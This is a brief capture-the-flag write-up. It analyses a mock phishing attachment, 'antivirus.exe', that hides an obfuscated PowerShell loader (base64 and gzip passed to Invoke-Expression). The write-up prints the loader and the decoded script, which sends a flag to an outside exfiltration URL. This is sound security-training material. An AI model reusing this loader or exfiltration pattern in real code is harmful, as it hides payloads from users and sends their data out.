# Computer Has Virus

> Help! I just fell victim to a phishing attack! I have attached the email they sent me. See if you can recover their secrets!

the attachment is given to be `base64` encoded so i decrypted it and made the `antivirus.exe` file manually

running `strings` on `antivirus.exe` gave me something interesting on the top 

```
$compressed = 'H4sIAAAAAAAA/1TNQWvyQBDG8Xs+xRgCrx4SFW+B8EJFtIcSMA1SSglxHZOlyW66+6xtEL97iVhpr8P8n19wbMqKEvKXLw/pdn3OFsKZOfoCtZm5qi7Svb1d5rZQMxSnhekLO7wtRhffC1gJSug16y24jXa8jzZAl0M2Ev1bHOemWSmhDzy+WhPyApSmYuSmGeAa6OLp1FkhcOSvo2xgSkitIqHb6f3A/4c6GTifPJiezh4RUWDYdlpZpoQe1Um/c7jj/ZY/HFtQmBtJv7zwiVHrA61Xz9d6ZyQ4TB06B/J/pmIKxvfdKEMJZ5f6wBOfvAuJEqK+6X/7fEPpZkSZbhm1VNU/S59Gq2o0dN53AAAA//+hRs8SawEAAA=='; 
$bytes = [System.Convert]::FromBase64String($compressed); 
$stream = New-Object IO.MemoryStream(, $bytes); 
$decompressed = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); 
$reader = New-Object IO.StreamReader($decompressed); 
$obfuscated = $reader.ReadToEnd(); 
Invoke-Expression $obfuscated
```

decrypting the message in `$compressed` from base64 gives the flag

```
$flag = "CYBORG{S3cur1ty_thr0ugh_Obscur1ty_1s_n0t_v3ry_s3cur3!}"
$enc = [System.Web.HttpUtility]::UrlEncode($flag) 
$targetUrl = "http://uscctfexfiltration.com/exfiltrate?flag=$enc" 
try {
    $response = Invoke-WebRequest -Uri $targetUrl -Method GET
    Write-Output "response: $($response.StatusCode)" 
} catch {
    Write-Output "UH OH! Something's wrong!" 
}
```
